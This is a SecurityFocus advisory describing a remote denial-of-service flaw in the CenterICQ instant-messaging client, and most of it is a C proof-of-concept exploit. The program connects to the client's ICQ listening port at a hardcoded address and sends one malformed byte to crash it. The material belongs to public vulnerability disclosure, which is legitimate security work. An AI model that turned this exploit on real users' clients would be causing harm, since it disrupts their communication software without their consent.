source: http://www.securityfocus.com/bid/15649/info

CenterICQ is prone to a remote denial-of-service vulnerability.

The vulnerability presents itself when the client is running on a computer that is directly connected to the Internet and handles malformed packets on the listening port for ICQ messages.

A successful attack can cause the client to crash. 

#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define DEST_IP   "192.168.1.33"
#define DEST_PORT 7777

    main()
    {
        int sockfd;
        struct sockaddr_in dest_addr;   // will hold the destination addr

        sockfd = socket(AF_INET, SOCK_STREAM, 0); // do some error checking!

        dest_addr.sin_family = AF_INET;          // host byte order
        dest_addr.sin_port = htons(DEST_PORT);   // short, network byte order
        dest_addr.sin_addr.s_addr = inet_addr(DEST_IP);
        memset(&(dest_addr.sin_zero), '\0', 8);  // zero the rest of the struct

        // don't forget to error check the connect()!
        connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr));
	char *msg[] = { 0x01 };
	send(sockfd, msg, 1, 0);
}